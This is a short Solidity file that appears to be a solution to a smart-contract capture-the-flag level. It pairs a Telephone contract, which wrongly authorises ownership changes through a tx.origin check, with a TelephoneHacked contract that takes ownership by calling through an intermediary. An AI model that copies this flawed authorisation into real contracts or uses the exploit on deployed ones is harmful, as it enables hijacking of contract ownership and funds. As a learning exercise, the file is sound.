// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneHacked{
    Telephone public tlf;

    constructor(address _adrsTlpf){
        tlf = Telephone(_adrsTlpf);
    }

    function getOwnership(address _adrs) public{
        tlf.changeOwner(_adrs);
    }

}